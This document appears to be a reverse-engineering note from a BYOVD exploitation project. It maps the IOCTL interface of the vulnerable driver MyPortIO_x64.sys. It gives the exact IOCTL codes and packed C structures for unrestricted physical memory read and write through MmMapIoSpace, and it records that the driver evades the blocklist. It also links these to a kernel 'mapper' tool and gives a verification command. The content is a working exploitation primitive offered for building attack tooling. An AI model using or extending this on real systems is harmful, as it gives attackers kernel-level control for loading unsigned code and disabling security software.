# MyPortIO_x64.sys — host copy + IOCTL map (IDA `0e7cd77a`)

**On disk (main PC):** `byovd/vehicles/MyPortIO_x64.sys` (same hash as Polychrome `audit/inbox/oem-sys/x64/`).

**Device:** `\\.\MyPortIODev` (symlink `\DosDevices\MyPortIODev`, kernel `\Device\MyPortIO0`).

**VM 26200:** loads (win32 0, not blocklist 1275). `DriverEntry` sets `*(a1+20)=1` so phys/map IOCTL branch is enabled without extra `CheckUsers` handshake for the paths below.

## Physical memory (MmMapIoSpace) — use these in mapper

| Name | IOCTL | Method | In (bytes) | Out | Handler |
|------|-------|--------|------------|-----|---------|
| **PHYS_READ_DWORD** | `0x9C406680` | buffered | **12** — `u64 Phys; u32 Size=4` | same 12 — `u64` field replaced by **dword read** | `sub_1400023E0` case `-1673501056` |
| **PHYS_WRITE_DWORD** | `0x9C40A684` | buffered | **16** — `u64 Phys; u32 Size=4; u32 Value` | (unused) | `sub_1400029B0` case `-1673484668` |

Driver calls `MmMapIoSpace(Phys, NumberOfBytes, MmNonCached)`, memcpy to/from user buffer, `MmUnmapIoSpace`. No chipset gate (unlike MsIo64).

### C layout (usermode)

```c
// Read: DeviceIoControl(h, 0x9C406680, &in, 12, &in, 12, &got, NULL);
#pragma pack(push, 1)
typedef struct {
    UINT64 Phys;
    UINT32 Size;   // must be 4 for map path
} MYPORT_PHYS_READ_INOUT;  // 12 bytes — do not pass sizeof() (16 with padding)

typedef struct {
    UINT64 Phys;
    UINT32 Size;
    UINT32 Value;
} MYPORT_PHYS_WRITE_IN;    // 16 bytes
#pragma pack(pop)
```

**Verified VM (elevated):** `VehiclePhysProbe.exe myport` — `pa=0x1100 write_rmw_ok`.

**Implementation:** `byovd/src/mapper/primitive_myport.hpp`, `VehiclePhysProbe.exe myport`, `mapper_nal --driver myport`.

## Other IOCTLs (SMBus / legacy port — not arbitrary kernel R/W)

| IOCTL | Role |
|-------|------|
| `0x9C40648C` | extended read path (SMBus-style; `sub_1400023E0`) |
| `0x9C406400`–`0x9C406408` | port R/W helpers |
| `0x9C406480` / `0x9C406484` | `CheckUsers` / user gate (`word_140006014`) |
| `0x9C40A440`–`0x9C40A488` | matching writes (`sub_140003FB0`, `sub_140003F10`) |
| `0x9C40A584` | write fan-out to `sub_1400029B0` (includes `0x9C40A684` phys write) |
| `0x9C40A5C8` / `0x9C40A604` / `0x9C40A644` | variant write sizes (still not full-page map) |

For BYOVD primitives, only **`0x9C406680`** / **`0x9C40A684`** are needed; align unaligned R/W via dword RMW in `MyPortPhysRead` / `MyPortPhysWrite`.

## Host test

Run **elevated** (SCM create/start):

```text
byovd\bin\VehiclePhysProbe.exe myport byovd\vehicles\MyPortIO_x64.sys
```

Expect `[+] myport ... write_rmw_ok` or gle 1275 if blocklist ever matches this hash.
